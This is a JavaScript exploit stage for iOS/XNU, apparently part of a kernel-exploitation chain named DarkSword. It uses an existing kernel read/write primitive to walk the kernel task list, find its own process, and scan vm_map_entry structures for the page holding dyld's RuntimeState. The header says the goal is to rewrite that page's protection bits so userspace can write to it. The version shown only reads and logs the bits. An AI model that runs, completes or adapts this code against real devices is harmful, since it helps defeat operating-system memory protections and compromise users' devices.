// vm_unprotect.js — Make a userspace page writable via vm_map_entry modification
//
// Uses kernel R/W to modify the vm_map_entry protection bits for the
// RuntimeState page, making it writable from userspace.
//
// vm_map_entry layout (from DarkSword/XNU):
//   +0x00: links.prev
//   +0x08: links.next
//   +0x10: links.start (VA start of this mapping)
//   +0x18: links.end (VA end of this mapping)
//   +0x48: packed bitfield with protection/max_protection
//          bits [5-7]: protection (3 bits)
//          bits [9-12]: max_protection (4 bits)
//
// Task struct: task + 0x28 = vm_map pointer

log('=== VM Map Entry Unprotect ===');

// Step 1: Find our task (safe kernel reads)
var kt = kread64(slide('0xc1bf78'));
var task = kread64(add(kt, '0x30'));
var ourPid = getpid_native();
var ourTask;
for (var i = 0; i < 600; i++) {
  if (task == '0x0' || task == kt) break;
  var procRO = kread64(add(task, '0x3e0'));
  if (procRO == '0x0') { task = kread64(add(task, '0x30')); continue; }
  var proc = kread64(procRO);
  if (proc == '0x0' || proc.indexOf('0xffffff') != 0) { task = kread64(add(task, '0x30')); continue; }
  if (parseInt(kread32(add(proc, '0x60')), 16) == ourPid) { ourTask = task; break; }
  task = kread64(add(task, '0x30'));
}
log('ourTask: ' + ourTask);

// Step 2: Read vm_map from task + 0x28
var vmMap = kread64(add(ourTask, '0x28'));
log('vm_map: ' + vmMap);

// Step 3: Get the RuntimeState address to find
var rangeBuf = umalloc(16);
var cacheBase = callSymbol('_dyld_get_shared_cache_range', rangeBuf);
ufree(rangeBuf);
var sc_slide = sub(cacheBase, '0x180000000');
var runtimeState = uread64(add('0x1ed3d0000', sc_slide));
var targetAddr = add(runtimeState, '0xb8');
log('target userspace addr: ' + targetAddr);
log('target page: ' + band(targetAddr, '0xfffffffffffff000'));

// Step 4: Read vm_map header to find first entry
// vm_map has a header at some offset. The entry list starts at header.links.next
// On XNU, vm_map_t->hdr.links is at the start of the struct
// vm_map.hdr.links.next = first entry
var firstEntry = kread64(add(vmMap, '0x8'));  // hdr.links.next
log('first vm_map_entry: ' + firstEntry);

// Step 5: Walk entries to find one covering our target address
// Each entry: +0x10 = start, +0x18 = end, +0x08 = next
var found = false;
var entry = firstEntry;
var targetPage = band(targetAddr, '0xfffffffffffff000');

for (var i = 0; i < 500; i++) {
  if (entry == '0x0') break;
  var start = kread64(add(entry, '0x10'));
  var end = kread64(add(entry, '0x18'));

  // Check if this entry covers our target
  // Compare as hex strings (both are userspace addresses < 0x300000000)
  // Simple check: if targetPage >= start && targetPage < end
  // We can't easily compare hex strings, so let me use sub and check sign
  var diffStart = sub(targetPage, start);
  var diffEnd = sub(end, targetPage);

  // If both diffs are positive (no overflow), the target is in range
  // A positive diff means the high bit is 0
  var startOk = (band(diffStart, '0x8000000000000000') == '0x0');
  var endOk = (band(diffEnd, '0x8000000000000000') == '0x0');

  if (startOk && endOk && diffEnd != '0x0') {
    log('FOUND entry at ' + entry);
    log('  start: ' + start);
    log('  end: ' + end);

    // Read the protection bitfield at +0x48
    var protField = kread32(add(entry, '0x48'));
    log('  prot field (raw): ' + protField);

    // Extract protection (bits 5-7) and max_protection (bits 9-12)
    var prot = band(shr(protField, '0x5'), '0x7');
    var maxProt = band(shr(protField, '0x9'), '0xf');
    log('  protection: ' + prot + ' max: ' + maxProt);
    log('  (1=R, 2=W, 3=RW, 5=RX, 7=RWX)');

    found = true;
    break;
  }

  entry = kread64(add(entry, '0x8'));  // next
  if (entry == firstEntry) break;  // wrapped around
}

if (!found) {
  log('[-] Could not find vm_map_entry for target address');
}

'vm_unprotect_scan_done';
